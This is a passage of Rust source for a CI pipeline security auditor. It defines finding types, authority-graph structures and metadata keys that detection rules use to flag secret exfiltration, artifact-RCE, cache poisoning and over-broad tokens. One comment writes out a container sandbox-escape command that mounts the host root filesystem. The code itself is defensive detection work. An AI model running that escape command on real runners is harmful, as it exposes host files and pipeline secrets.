    pub attacker_surface_kinds: Vec<String>,

    /// Template/reusable-workflow resolution strength for delegation findings:
    /// `resolved`, `partial`, `opaque`, or `not_applicable`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub template_resolution_strength: Option<String>,

    /// Relationship between this finding and any cited CVE/advisory:
    /// `same_primitive`, `same_authority_shape`, `analogue_only`, or
    /// `not_applicable`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub cve_relationship: Option<String>,
}

impl FindingExtras {
    /// Convenience constructor for the common case of "default extras
    /// plus a per-finding fingerprint anchor". Used by rules whose
    /// emission sites have no natural graph-node anchor and need the
    /// anchor to discriminate multiple findings of the same rule in one
    /// file (see `compute_fingerprint` v3 contract).
    pub fn with_anchor(anchor: impl Into<String>) -> Self {
        Self {
            fingerprint_anchor: Some(anchor.into()),
            ..Self::default()
        }
    }

    /// Convenience constructor for report-facing metadata that is not a
    /// fingerprint anchor. Keeps rule call sites additive rather than forcing
    /// every built-in rule to hand-populate publication context.
    pub fn with_confidence_scope(scope: impl Into<String>) -> Self {
        Self {
            confidence_scope: Some(scope.into()),
            ..Self::default()
        }
    }
}

#[allow(clippy::trivially_copy_pass_by_ref)]
fn is_false(b: &bool) -> bool {
    !*b
}

/// A finding is a concrete, actionable authority issue.
#[allow(missing_docs)]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub severity: Severity,
    pub category: FindingCategory,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub path: Option<PropagationPath>,
    pub nodes_involved: Vec<NodeId>,
    pub message: String,
    pub recommendation: Recommendation,
    /// Provenance of this finding. Defaults to `BuiltIn` for backward
    /// compatibility with code/JSON that predates the field — every
    /// in-tree built-in rule sets this explicitly. Deserialization of older
    /// JSON without the field treats the finding as built-in.
    #[serde(default)]
    pub source: FindingSource,
    /// Optional metadata (group id, time-to-fix, compensating controls,
    /// suppression markers). Flattens into the JSON object so consumers
    /// see top-level fields — see `FindingExtras` for individual semantics.
    #[serde(flatten, default)]
    pub extras: FindingExtras,
}

impl Finding {
    /// Builder helper: attach a `time_to_fix` annotation to this finding.
    /// Call sites: `let f = Finding { ... }.with_time_to_fix(FixEffort::Trivial);`
    pub fn with_time_to_fix(mut self, effort: FixEffort) -> Self {
        self.extras.time_to_fix = Some(effort);
        self
    }

    /// Builder helper: append a compensating control description and
    /// downgrade severity by one tier (Critical -> High -> Medium -> Low -> Info).
    /// Records the original severity so the audit trail survives.
    pub fn with_compensating_control(mut self, control: impl Into<String>) -> Self {
        let original = self.severity;
        self.extras.compensating_controls.push(control.into());
        self.severity = downgrade_severity(self.severity);
        if self.extras.original_severity.is_none() {
            self.extras.original_severity = Some(original);
        }
        self
    }
}

// ── Graph types: NodeId / EdgeId aliases ─────────────────────────

/// Unique identifier for a node in the authority graph.
///
/// **Stability contract.** `NodeId` values are dense indices stable within a
/// single scan / graph emission (`taudit graph --format json`). They are
/// **not** stable across separate scans — two runs against the same input
/// pipeline can renumber nodes if the parser visits them in a different
/// order. Downstream consumers that need cross-run identity should key on
/// the finding `fingerprint` (in JSON / SARIF / CloudEvents output) rather
/// than `NodeId`. See `docs/finding-fingerprint.md`.
pub type NodeId = usize;

/// Unique identifier for an edge in the authority graph.
///
/// **Stability contract.** Same caveat as [`NodeId`] — dense indices stable
/// within one emitted graph, NOT stable across runs. Use fingerprints for
/// cross-run identity.
pub type EdgeId = usize;

// ── Metadata key constants ───────────────────────────────────────
// Avoids stringly-typed bugs across crate boundaries.
//
// Every constant below is a key string that downstream consumers may read
// from `Node.metadata` or `AuthorityGraph.metadata` in emitted JSON.

/// Records the digest of a pinned action / image reference.
pub const META_DIGEST: &str = "digest";
/// Records the `permissions:` block scoped to an Identity / Step node.
pub const META_PERMISSIONS: &str = "permissions";
/// Records the inferred breadth of an identity's scope (`broad` / `constrained` / `unknown`).
pub const META_IDENTITY_SCOPE: &str = "identity_scope";
/// Marks a metadata value that the parser inferred rather than read literally.
pub const META_INFERRED: &str = "inferred";
/// Marks an Image node as a job container (not a `uses:` action).
pub const META_CONTAINER: &str = "container";
/// Marks an Identity node as OIDC-capable (`permissions: id-token: write`).
pub const META_OIDC: &str = "oidc";
/// Marks a Secret node whose value is interpolated into a CLI flag argument (e.g. `-var "key=$(SECRET)"`).
/// CLI flag values appear in pipeline log output even when ADO secret masking is active,
/// because the command string is logged before masking runs and Terraform itself logs `-var` values.
pub const META_CLI_FLAG_EXPOSED: &str = "cli_flag_exposed";
/// Graph-level metadata: identifies the trigger type (e.g. `pull_request_target`, `pr`).
pub const META_TRIGGER: &str = "trigger";
/// Marks a Step that writes to the environment gate (`$GITHUB_ENV`, ADO `##vso[task.setvariable]`).
pub const META_WRITES_ENV_GATE: &str = "writes_env_gate";
/// Marks a Step that writes a `$(secretRef)` value to the env gate. Co-set with
/// META_WRITES_ENV_GATE when the written VALUE contains an ADO `$(VAR)` expression,
/// distinguishing secret-exfiltration from plain-integer or literal env-gate writes.
pub const META_ENV_GATE_WRITES_SECRET_VALUE: &str = "env_gate_writes_secret_value";
/// Marks a Step that came from an ADO `##vso[task.setvariable]` call (as opposed to
/// a GHA `>> $GITHUB_ENV` redirect). Used to distinguish the two env-gate write
/// patterns so BUG-4 suppression only applies to ADO plain-value writes.
pub const META_SETVARIABLE_ADO: &str = "setvariable_ado";
/// Marks a Step that reads from the runner-managed environment via an
/// `env.<NAME>` template reference — `${{ env.X }}` in a `with:` value,
/// inline script body, or step `env:` mapping. Distinct from `secrets.X`
/// references (which produce a HasAccessTo edge to a Secret node) — `env.X`
/// references can be sourced from the ambient runner environment, including
/// values laundered through `$GITHUB_ENV` by an earlier step. Stamped by
/// the GHA parser so `secret_via_env_gate_to_untrusted_consumer` can find
/// the gate-laundering chain that the explicit-secret rules miss.
pub const META_READS_ENV: &str = "reads_env";
/// Marks a Step that performs cryptographic provenance attestation (e.g. `actions/attest-build-provenance`).
pub const META_ATTESTS: &str = "attests";
/// Marks a Secret node sourced from an ADO variable group (vs inline pipeline variable).
pub const META_VARIABLE_GROUP: &str = "variable_group";
/// Marks an Image node as a self-hosted agent pool (pool.name on ADO; runs-on: self-hosted on GHA).
pub const META_SELF_HOSTED: &str = "self_hosted";
/// Marks a Step that performs a `checkout: self` (ADO) or default `actions/checkout` on a PR context.
pub const META_CHECKOUT_SELF: &str = "checkout_self";
/// Marks an Identity node as an ADO service connection.
pub const META_SERVICE_CONNECTION: &str = "service_connection";
/// Marks an Identity node as implicitly injected by the platform (e.g. ADO System.AccessToken).
/// Implicit tokens are structurally accessible to all tasks by platform design — exposure
/// to untrusted steps is Info-level (structural) rather than Critical (misconfiguration).
pub const META_IMPLICIT: &str = "implicit";
/// Marks a Step that belongs to an ADO deployment job whose `environment:` is
/// configured with required approvals — a manual gate that breaks automatic
/// authority propagation. Findings whose path crosses such a node have their
/// severity reduced by one step (Critical → High → Medium → Low).
pub const META_ENV_APPROVAL: &str = "env_approval";
/// Records the parent job name on every Step node, enabling per-job subgraph
/// filtering (e.g. `taudit map --job build`) and downstream consumers that
/// need to attribute steps back to their containing job. Set by both the GHA
/// and ADO parsers on every Step they create within a job's scope.
pub const META_JOB_NAME: &str = "job_name";
/// Step-level metadata: normalized GitHub Actions `uses:` action name without
/// its `@ref` suffix, for example `docker/login-action`. Set only by the GHA
/// parser on `uses:` steps.
pub const META_GHA_ACTION: &str = "gha_action";
/// Step-level metadata: sorted scalar `with:` inputs for a GHA `uses:` step,
/// encoded as newline-delimited `key=value` records. Non-scalar inputs are
/// omitted. Consumed by action-specific rules that need precision controls
/// such as `mask-password: false` or `skip_install: true`.
pub const META_GHA_WITH_INPUTS: &str = "gha_with_inputs";
/// Graph-level metadata: JSON-encoded array of `resources.repositories[]`
/// entries declared by the pipeline. Each entry is an object with fields
/// `alias`, `repo_type`, `name`, optional `ref`, and `used` (true when the
/// alias is referenced via `template: x@alias`, `extends: x@alias`, or
/// `checkout: alias` somewhere in the same pipeline file). Set by the ADO
/// parser; consumed by `template_extends_unpinned_branch`.
pub const META_REPOSITORIES: &str = "repositories";
/// Records the raw inline script body of a Step (the text from
/// `script:` / `bash:` / `powershell:` / `pwsh:` / `run:` / task
/// `inputs.script` / `inputs.Inline` / `inputs.inlineScript`). Stamped by
/// parsers when the step has an inline script. Consumed by script-aware
/// rules: `vm_remote_exec_via_pipeline_secret`,
/// `short_lived_sas_in_command_line`, `secret_to_inline_script_env_export`,
/// `secret_materialised_to_workspace_file`, `keyvault_secret_to_plaintext`,
/// `add_spn_with_inline_script`, `parameter_interpolation_into_shell`.
/// Stored verbatim — rules apply their own pattern matching.
pub const META_SCRIPT_BODY: &str = "script_body";
/// Records the name of the ADO service connection a step uses (the value of
/// `inputs.azureSubscription` / `inputs.connectedServiceName*`). Set on the
/// Step node itself (in addition to the Identity node it links to) so rules
/// can pattern-match on the connection name without traversing edges.
pub const META_SERVICE_CONNECTION_NAME: &str = "service_connection_name";
/// Marks a Step as performing `terraform apply ... -auto-approve` (either via
/// an inline script or via a `TerraformCLI` / `TerraformTask` task with
/// `command: apply` and `commandOptions` containing `auto-approve`).
pub const META_TERRAFORM_AUTO_APPROVE: &str = "terraform_auto_approve";
/// Marks a Step task that runs with `addSpnToEnvironment: true`, exposing
/// the federated SPN (idToken / servicePrincipalKey / servicePrincipalId /
/// tenantId) to the inline script body via environment variables.
pub const META_ADD_SPN_TO_ENV: &str = "add_spn_to_environment";
/// Graph-level metadata: identifies the source platform of the parsed
/// pipeline. Set by every parser to its `platform()` value
/// (`"github-actions"`, `"azure-devops"`, `"gitlab"`). Allows platform-scoped
/// rules to gate their detection without parsing the source file path.
pub const META_PLATFORM: &str = "platform";
/// Graph-level metadata: marks a GitHub Actions workflow as having NO
/// top-level `permissions:` block declared. Set by the GHA parser when
/// `workflow.permissions` is absent so rules can detect the negative-space
/// "no permissions block at all" pattern (which leaves `GITHUB_TOKEN` at its
/// broad platform default — `contents: write`, `packages: write`, etc.).
pub const META_NO_WORKFLOW_PERMISSIONS: &str = "no_workflow_permissions";
/// Marks a Step in a GHA workflow as carrying an `if:` condition that
/// references the standard fork-check pattern
/// (`github.event.pull_request.head.repo.fork == false` or the equivalent
/// `head.repo.full_name == github.repository`). Stamped by the GHA parser so
/// rules can credit the step with the compensating control without
/// re-parsing the YAML expression. Bool stored as `"true"`.
pub const META_FORK_CHECK: &str = "fork_check";
/// Marks a GitLab CI job (Step node) whose `rules:` or `only:` clause
/// restricts execution to protected branches — either via an explicit
/// `if: $CI_COMMIT_REF_PROTECTED == "true"` rule, an `if: $CI_COMMIT_BRANCH
/// == $CI_DEFAULT_BRANCH` rule, or an `only: [main, ...]` allowlist of
/// platform-protected refs. Set by the GitLab parser. Absence on a
/// deployment job is a control gap.
pub const META_RULES_PROTECTED_ONLY: &str = "rules_protected_only";
/// Graph-level metadata: comma-joined list of every entry under `on:` (e.g.
/// `pull_request_target,issue_comment,workflow_run`). Distinct from
/// `META_TRIGGER` (singular) which is set only for `pull_request_target` /
/// ADO `pr` to preserve the existing `trigger_context_mismatch` contract.
/// Consumers of this list (e.g. `risky_trigger_with_authority`) must split on
/// `,` and treat each token as a trigger name.
pub const META_TRIGGERS: &str = "triggers";
/// Graph-level metadata: comma-joined list of `workflow_dispatch.inputs.*`
/// names declared by the workflow. Empty / absent if the workflow has no
/// `workflow_dispatch` trigger. Consumed by
/// `manual_dispatch_input_to_url_or_command` to taint-track input flow into
/// command lines, URLs, and `actions/checkout` refs.
pub const META_DISPATCH_INPUTS: &str = "dispatch_inputs";
/// Graph-level metadata: pipe-delimited list of `<job>\t<name>\t<source>`
/// records, one per `jobs.<id>.outputs.<name>`. Records are joined with `|`,
/// fields within a record with `\t`. `source` is one of `secret` (value
/// reads `secrets.*`), `oidc` (value references `steps.*.outputs.*` from a
/// step that holds an OIDC identity), `step_output` (any other
/// `steps.*.outputs.*`), or `literal`. Plain-text rather than JSON to keep
/// the parser crate free of `serde_json`. Consumed by
/// `sensitive_value_in_job_output`.
pub const META_JOB_OUTPUTS: &str = "job_outputs";
/// Step-level metadata: the value passed to `actions/checkout`'s `with.ref`
/// input (verbatim, including any `${{ … }}` expressions). Stamped only on
/// `actions/checkout` steps that supply a `ref:`. Consumed by
/// `manual_dispatch_input_to_url_or_command`.
pub const META_CHECKOUT_REF: &str = "checkout_ref";
/// Marks the synthetic Step node created for a job that delegates to a
/// reusable workflow with `secrets: inherit`. The whole secret bag forwards
/// to the callee regardless of what the callee actually consumes — when the
/// caller is fired by an attacker-controllable trigger this is a wide-open
/// exfiltration path. Set on the synthetic step node by the GHA parser.
pub const META_SECRETS_INHERIT: &str = "secrets_inherit";
/// Marks a Step that downloads a workflow artifact (typically
/// `actions/download-artifact` or `dawidd6/action-download-artifact`).
/// In `workflow_run`-triggered consumers, the originating run's artifacts
/// were produced from PR context — the consumer must treat their content as
/// untrusted input even when the consumer itself runs with elevated perms.
pub const META_DOWNLOADS_ARTIFACT: &str = "downloads_artifact";
/// Marks a Step whose body interprets artifact (or other untrusted file)
/// content into a privileged sink — `unzip`/`tar -x`, `cat`/`jq` piping
/// into `>> $GITHUB_ENV`/`>> $GITHUB_OUTPUT`, `eval`, posting to a PR
/// comment via `actions/github-script` `body:`/`issue_body:`, or evaluating
/// extracted text. Combined with `META_DOWNLOADS_ARTIFACT` upstream in the
/// same job and a `workflow_run`/`pull_request_target` trigger this is the
/// classic mypy_primer / coverage-comment artifact-RCE pattern.
pub const META_INTERPRETS_ARTIFACT: &str = "interprets_artifact";
/// Marks a Step that uses an interactive debug action (mxschmitt/action-tmate,
/// lhotari/action-upterm, actions/tmate, etc.). The cell value is the action
/// reference (e.g. `mxschmitt/action-tmate@v3`). A successful debug session
/// gives the operator an external SSH endpoint with the runner's full
/// environment loaded — every secret in scope, the checked-out HEAD, and
/// write access to whatever the GITHUB_TOKEN holds.
pub const META_INTERACTIVE_DEBUG: &str = "interactive_debug";
/// Marks a Step that calls `actions/cache` (or `actions/cache/save` /
/// `actions/cache/restore`). The cell value is the raw `key:` input from
/// the step's `with:` block. Consumed by `pr_specific_cache_key_in_default_branch_consumer`
/// to detect PR-derived cache keys (head_ref, head.ref, actor) that a
/// default-branch run can later restore — classic cache poisoning.
pub const META_CACHE_KEY: &str = "cache_key";
/// Records the OIDC audience (`aud:`) value of an `id_tokens:` entry on an
/// Identity node. GitLab CI emits one Identity per `id_tokens:` key; the
/// audience is what trades for downstream cloud creds (Vault path, AWS role,
/// etc), so audience reuse across MR-context and protected-context jobs is
/// the precise privilege-overscope signal. Set by the GitLab parser.
pub const META_OIDC_AUDIENCE: &str = "oidc_audience";
/// Records the comma-joined list of `id_tokens.aud:` values when GitLab CI
/// declares the audience as a YAML sequence (multi-cloud broker — strongest
/// over-scoping signal). When set, the legacy `META_OIDC_AUDIENCE` field
/// holds the same comma-joined string for backward compatibility, and this
/// field is the explicit "this was a list" marker. Set by the GitLab parser
/// only on the multi-aud path; absent for scalar `aud:` values.
pub const META_OIDC_AUDIENCES: &str = "oidc_audiences";
/// Records a Step's `environment:url:` value verbatim. Stamped by the GitLab
/// parser when the job declares an `environment:` mapping with a `url:`
/// field. Consumed by `untrusted_ci_var_in_shell_interpolation` because
/// `environment:url:` is rendered by the GitLab UI and any predefined-CI-var
/// interpolated into it is a stored-XSS / open-redirect sink.
pub const META_ENVIRONMENT_URL: &str = "environment_url";
/// Graph-level metadata: JSON-encoded array of `include:` entries declared by
/// a GitLab CI pipeline. Each entry is an object with fields:
/// - `kind`: one of `local`, `remote`, `template`, `project`, `component`
/// - `target`: the path/URL/project string
/// - `git_ref`: the resolved `ref:` value (only meaningful for `project` and
///   `remote`) — empty string when the include omits a `ref:`
///
/// Set by the GitLab parser; consumed by `unpinned_include_remote_or_branch_ref`.
pub const META_GITLAB_INCLUDES: &str = "gitlab_includes";
/// Marks a Step (GitLab job) that declares one or more `services:` entries
/// matching `docker:*-dind` or `docker:dind`. Combined with secret-bearing
/// HasAccessTo edges it indicates a runtime sandbox-escape primitive — any
/// inline build step can `docker run -v /:/host` from inside dind.
pub const META_GITLAB_DIND_SERVICE: &str = "gitlab_dind_service";
/// Marks a Step (GitLab job) declared with `allow_failure: true`. Used by
/// `security_job_silently_skipped` to detect scanner jobs that pass silently.
pub const META_GITLAB_ALLOW_FAILURE: &str = "gitlab_allow_failure";
/// Records the comma-joined list of `extends:` template names a GitLab job
/// inherits from. Used by scanner-name pattern matching in
/// `security_job_silently_skipped` because GitLab security templates are
/// usually consumed via `extends:` rather than by job-name match.
pub const META_GITLAB_EXTENDS: &str = "gitlab_extends";
/// Marks a Step (GitLab job) that defines a `trigger:` block (downstream /
/// child pipeline). Value is `"static"` for a fixed downstream `project:` or
/// `include:` of in-tree YAML, and `"dynamic"` when the include source is an
/// `artifact:` (dynamic child pipelines — code-injection sink).
pub const META_GITLAB_TRIGGER_KIND: &str = "gitlab_trigger_kind";
/// Records the literal `cache.key:` value declared on a GitLab job (or the
/// empty string if no cache is declared). Consumed by
/// `cache_key_crosses_trust_boundary` to detect cross-trust cache keys.
pub const META_GITLAB_CACHE_KEY: &str = "gitlab_cache_key";
/// Records the `cache.policy:` value declared on a GitLab job
/// (`pull` / `push` / `pull-push` / `pull_push`). When absent, the GitLab
/// runtime default is `pull-push`. Consumed by
/// `cache_key_crosses_trust_boundary`.
pub const META_GITLAB_CACHE_POLICY: &str = "gitlab_cache_policy";
/// Records the deployment environment name on a Step
/// (e.g. GitLab `environment.name:` / GHA `environment:`).
/// Used by rules that gate on production-like environment names.
pub const META_ENVIRONMENT_NAME: &str = "environment_name";
/// Records the GitLab `artifacts.reports.dotenv:` file path for a Step.
/// When set, the file's `KEY=value` lines are silently exported as
/// pipeline variables for every downstream job that consumes this job
/// via `needs:` or `dependencies:`. Consumed by
/// `dotenv_artifact_flows_to_privileged_deployment`.
pub const META_DOTENV_FILE: &str = "dotenv_file";
/// Records, on a Step, the upstream job names this step consumes via
/// GitLab `needs:` or `dependencies:`. Comma-separated job names.
/// Used to build dotenv-flow dependency chains across stages.
pub const META_NEEDS: &str = "needs";
/// Marks an Image node (self-hosted agent pool) as having workspace isolation
/// configured (`workspace: { clean: all }` or `workspace: { clean: true }` in
/// ADO). When present, the agent workspace is wiped between runs, mitigating
/// workspace poisoning attacks where a PR build leaves malicious files for the
/// next privileged pipeline run. Absence of this key on a self-hosted Image
/// node is the signal for `shared_self_hosted_pool_no_isolation`.
pub const META_WORKSPACE_CLEAN: &str = "workspace_clean";
/// Step-level metadata: the AND-joined chain of `condition:` expressions that
/// gate this step's runtime execution (stage condition, then job condition,
/// then step condition, joined with ` AND `). Stamped by parsers that surface
/// runtime gating expressions — currently the ADO parser (stage / job / step
/// `condition:`). Presence of this key means the step is NOT unconditionally
/// reachable on every trigger; the runtime evaluator decides via expression
/// (e.g. `eq(variables['Build.SourceBranch'], 'refs/heads/main')`). Consumed
/// by `apply_compensating_controls` to downgrade severity on findings whose
/// firing step is gated behind a conditional.
pub const META_CONDITION: &str = "condition";
/// Step-level metadata: comma-joined list of upstream stage / job names this
/// step's container declared via a non-default `dependsOn:` value. Default ADO
/// behaviour ("depends on the previous job/stage") is NOT stamped — only
/// explicit overrides. Currently a parser-side hook for future cross-job
/// taint rules; no consumer rule exists yet.
pub const META_DEPENDS_ON: &str = "depends_on";

// ── Shared serde helpers ─────────────────────────────────────────

/// Serialize a `HashMap<String, V>` with keys in sorted order. The
/// in-memory representation stays a `HashMap` (cheaper insertion, hot
/// path on every parser); only the serialized form is canonicalised.
/// This is the single point of determinism control for graph metadata
/// emitted via JSON / SARIF / CloudEvents — without it, HashMap iteration
/// order leaks per-process randomness into every diff and cache key.
///
/// Public so the engine crate (`taudit-core`) can apply the same
/// canonical ordering to its `AuthorityGraph` HashMap fields.
#[doc(hidden)]
pub fn serialize_string_map_sorted<S, V>(
    map: &HashMap<String, V>,
    serializer: S,
) -> Result<S::Ok, S::Error>
where
    S: Serializer,
    V: Serialize,
{
    let sorted: BTreeMap<&String, &V> = map.iter().collect();
    sorted.serialize(serializer)
}

// ── Graph-level precision markers ────────────────────────────────

/// The category of reason why a graph is partial.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum GapKind {
    /// A template or matrix expression hides a value; graph structure is intact.
    Expression,
    /// An unresolvable component (composite action, reusable workflow, extends,
    /// include) breaks the authority chain.
    Structural,
    /// The graph cannot be built at all (zero steps produced, unknown platform).
    Opaque,
}

/// How complete is this authority graph? Parsers set this based on whether
/// they could fully resolve all authority relationships in the pipeline YAML.
///
/// A `Partial` graph is still useful — it just tells the consumer that some
/// authority paths may be missing. This is better than silent incompleteness.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AuthorityCompleteness {
    /// Parser resolved all authority relationships.
    Complete,
    /// Parser found constructs it couldn't fully resolve (e.g. secrets in
    /// shell strings, composite actions, reusable workflows). The graph
    /// captures what it can, but edges may be missing.
    Partial,
    /// Parser couldn't determine completeness.
    Unknown,
}

/// How broad is an identity's scope? Classifies the risk surface of tokens,
/// service principals, and OIDC identities.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum IdentityScope {
    /// Wide permissions: write-all, admin, or unscoped tokens.
    Broad,
    /// Narrow permissions: contents:read, specific scopes.
    Constrained,
    /// Scope couldn't be determined — treat as risky.
    Unknown,
}

impl IdentityScope {
    /// Classify an identity scope from a permissions string.
    pub fn from_permissions(perms: &str) -> Self {
        let p = perms.to_lowercase();
        if p.contains("write-all") || p.contains("admin") || p == "{}" || p.is_empty() {
            IdentityScope::Broad
        } else if p.contains("write") {
            // Any write permission = broad (conservative)
            IdentityScope::Broad
        } else if p.contains("read") {
            IdentityScope::Constrained
        } else {
            IdentityScope::Unknown
        }
    }
}

// ── Node types ───────────────────────────────────────────────────

/// Semantic kind of a graph node.
#[allow(missing_docs)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NodeKind {
    Step,
    Secret,
    Artifact,
    Identity,
    Image,
}

/// Trust classification. Explicit on every node — not inferred from kind.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TrustZone {
    /// Code/config authored by the repo owner.
    FirstParty,
    /// Marketplace actions, external images (pinned).
    ThirdParty,
    /// Unpinned actions, fork PRs, user input.
    Untrusted,
}

impl TrustZone {
    /// Returns true if `self` is a lower trust level than `other`.
    pub fn is_lower_than(&self, other: &TrustZone) -> bool {
        self.rank() < other.rank()
    }

    fn rank(&self) -> u8 {
        match self {
            TrustZone::FirstParty => 2,
            TrustZone::ThirdParty => 1,
            TrustZone::Untrusted => 0,
        }
    }
}

/// A node in the authority graph.
#[allow(missing_docs)]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Node {
    pub id: NodeId,
    pub kind: NodeKind,
    pub name: String,
    pub trust_zone: TrustZone,
    /// Flexible metadata: pinning status, digest, scope, permissions, etc.
    /// Serialized in sorted-key order so JSON / SARIF / CloudEvents output
    /// is byte-deterministic across runs (HashMap iteration is randomised
    /// per process, which would otherwise break diffs and cache keys).
    #[serde(serialize_with = "serialize_string_map_sorted")]
    pub metadata: HashMap<String, String>,
}

// ── Edge types ───────────────────────────────────────────────────

/// Edge semantics model authority/data flow — not syntactic YAML relations.
/// Design test: "Can authority propagate along this edge?"
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EdgeKind {
    /// Step -> Secret or Identity (authority granted at runtime).
    HasAccessTo,
    /// Step -> Artifact (data flows out).
    Produces,
    /// Artifact -> Step (authority flows from artifact to consuming step).
    Consumes,
    /// Step -> Image/Action (execution delegation).
    UsesImage,
    /// Step -> Step (cross-job or action boundary).
    DelegatesTo,
    /// Step -> Secret or Identity (credential written to disk, outliving the step's lifetime).
    /// Distinct from HasAccessTo: disk persistence is accessible to all subsequent steps
    /// and processes with filesystem access, not just the step that created it.
    PersistsTo,
}

/// Abbreviated authority context for **`HasAccessTo` → identity** edges in
/// JSON exports (ADR 0002 Phase 2). Copied from the target identity’s trust
/// zone and selected `metadata` keys so consumers need not reverse-engineer
/// raw `META_*` strings for common questions. Omitted on edges where absent.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct AuthorityEdgeSummary {
    /// Target identity trust zone (`first_party` / `third_party` / `untrusted`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub trust_zone: Option<String>,
    /// Copy of `identity_scope` metadata when present.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub identity_scope: Option<String>,
    /// Copy of `permissions` metadata when present, truncated for bounded JSON.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub permissions_summary: Option<String>,
}

/// Maximum characters per summary string field on [`AuthorityEdgeSummary`].
pub const AUTHORITY_EDGE_SUMMARY_FIELD_MAX: usize = 192;

/// A directed edge in the authority graph.
#[allow(missing_docs)]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Edge {
    pub id: EdgeId,
    pub from: NodeId,
    pub to: NodeId,
    pub kind: EdgeKind,
    /// Present on `has_access_to` edges whose target is an identity node.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub authority_summary: Option<AuthorityEdgeSummary>,
}

// ── Pipeline source ──────────────────────────────────────────────

/// Where the pipeline definition came from.
#[allow(missing_docs)]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PipelineSource {
    pub file: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub repo: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub git_ref: Option<String>,
    /// SHA of the commit being analyzed; reproducibility hint when set.
    /// Parsers leave None; CI integrations populate this from the build env.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub commit_sha: Option<String>,
}

// ── Pipeline parameter spec ──────────────────────────────────────

/// Pipeline-level parameter declaration captured from a top-level
/// `parameters:` block. Used by rules that need to reason about whether
/// caller-supplied parameter values are constrained (`values:` allowlist)
/// or free-form (no allowlist on a string parameter — shell-injection risk).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ParamSpec {
    /// Declared parameter type (`string`, `number`, `boolean`, `object`, etc.).
    /// Empty string when the YAML omitted `type:` (ADO defaults to string).
    pub param_type: String,
    /// True when the parameter declares a `values:` allowlist that constrains
    /// the set of acceptable inputs. When true, free-form shell injection is
    /// not possible because the runtime rejects any value outside the list.
    pub has_values_allowlist: bool,
}

// ── Propagation path (wire type for Finding.path) ────────────────

/// A path that authority took through the graph.
/// The path is the product — it's what makes findings persuasive.
///
/// This is a **wire type**: it serialises into `Finding.path` in JSON output
/// and SARIF `properties.path`. The BFS algorithm that produces these paths
/// lives in `taudit-core::propagation` (workspace-internal); this struct is
/// the stable contract.
#[allow(missing_docs)]
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PropagationPath {
    /// The authority origin (Secret or Identity).
    pub source: NodeId,
    /// Where authority ended up.
    pub sink: NodeId,
    /// The full edge path from source to sink.
    pub edges: Vec<EdgeId>,
    /// Did this path cross a trust zone boundary?
    pub crossed_boundary: bool,
    /// If crossed, from which zone to which zone.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub boundary_crossing: Option<(TrustZone, TrustZone)>,
}
